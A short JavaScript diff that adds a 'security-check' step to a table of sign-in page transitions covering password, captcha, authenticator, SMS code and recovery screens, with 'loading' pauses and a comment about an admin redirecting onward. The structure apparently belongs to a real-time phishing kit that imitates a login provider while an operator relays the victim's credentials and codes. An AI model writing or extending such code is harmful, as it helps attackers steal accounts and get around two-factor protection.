@@ -1308,7 +1308,7 @@ function wireContinueButtons(){
   var DESIGN_NEXT = {
     'go': { 'signin': 'signinp', 'signinp': 'signinploading' },
     // ge: email → loading; password → loading; admin redirects onward
-    'ge': { 'signin': 'loading', 'password': 'loading', 'noaccount': '', 'captcha': '', 'recaptcha': 'loading', 'confirmrecovery': 'loading', 'checkphone': '', 'authenticator': 'loading', 'confirmphone': 'smscode', 'sendcode': 'smscode', 'smscode': 'loading' }
+    'ge': { 'signin': 'loading', 'password': 'loading', 'noaccount': '', 'captcha': '', 'recaptcha': 'loading', 'security-check': 'loading', 'confirmrecovery': 'loading', 'checkphone': '', 'authenticator': 'loading', 'confirmphone': 'smscode', 'sendcode': 'smscode', 'smscode': 'loading' }
   };
   var NEXT = (DESIGN_NEXT[loc.design]) || { 'signin': 'signinp', 'signinp': 'loading' };
   var bodyNext = document.body && document.body.getAttribute && document.body.getAttribute('data-ux-next');
